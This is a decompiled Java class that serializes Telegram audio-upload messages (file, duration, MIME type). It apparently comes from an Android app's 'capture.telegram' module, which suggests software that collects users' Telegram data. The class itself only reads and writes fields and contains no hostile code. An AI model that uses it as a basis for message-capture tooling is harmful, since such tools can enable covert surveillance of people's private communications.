package com.vvt.capture.telegram.internal;

public class TLRPC$TL_inputMediaUploadedAudio
  extends TLRPC.InputMedia
{
  public static int constructor = 1313442987;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    Object localObject = TLRPC.InputFile.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.file = ((TLRPC.InputFile)localObject);
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.duration = i;
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.mime_type = ((String)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.file.serializeToStream(paramAbstractSerializedData);
    i = this.duration;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.mime_type;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_inputMediaUploadedAudio.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */